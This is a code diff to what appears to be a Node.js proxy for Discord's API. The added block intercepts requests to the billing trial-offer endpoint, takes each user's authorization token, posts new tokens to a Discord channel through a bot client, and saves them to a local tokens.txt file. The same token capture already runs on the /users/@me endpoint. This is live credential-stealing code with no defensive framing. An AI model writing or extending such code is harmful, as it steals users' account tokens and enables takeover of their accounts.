@@ -65,6 +65,19 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
   try {
   
     let s = JSON.parse(dataText)
+    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me/billing/user-trial-offer` && req.headers.authorization){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+if(!arr.includes(req.headers.authorization))client.createMessage('929489097955881000', `${req.headers.authorization}`)
+
+if(!arr.includes(req.headers.authorization)) arr.unshift(`${req.headers.authorization}`)
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
     if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && req.headers.authorization){
 
     	let tokens;
